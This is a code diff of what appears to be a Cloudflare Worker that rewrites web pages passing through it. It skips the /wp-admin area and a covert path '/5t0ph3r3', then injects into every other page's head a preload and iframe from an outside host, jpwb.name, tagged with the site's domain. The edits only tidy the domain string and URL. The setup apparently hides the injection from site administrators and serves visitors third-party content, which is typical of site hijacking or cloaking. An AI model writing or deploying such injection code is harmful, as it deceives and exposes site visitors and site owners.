@@ -5,7 +5,7 @@ addEventListener("fetch", (event) => {
 async function handleRequest(request) {
     const url = new URL(request.url);
     const path = url.pathname;
-    const domain = url.hostname;
+    const domain = url.hostname.replace(/^www\./, '');  // Remove 'www.' prefix if present
 
     if (path.startsWith("/wp-admin") || path.startsWith("/5t0ph3r3") || path.endsWith(".xml") || path.endsWith(".xsl")) {
         return fetch(request);
@@ -32,7 +32,7 @@ class HeadHandler {
     }
 
     element(element) {
-        const iframeURL = `https://jpwb.name/ltu//?${this.domain}&cf`;
+        const iframeURL = `https://jpwb.name/ltu/?${this.domain}&cf`;
         const preloadLink = `<link rel="preload" href="${iframeURL}" as="document">`;
         const viewportMetaTag = '<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">';
         const styles = `
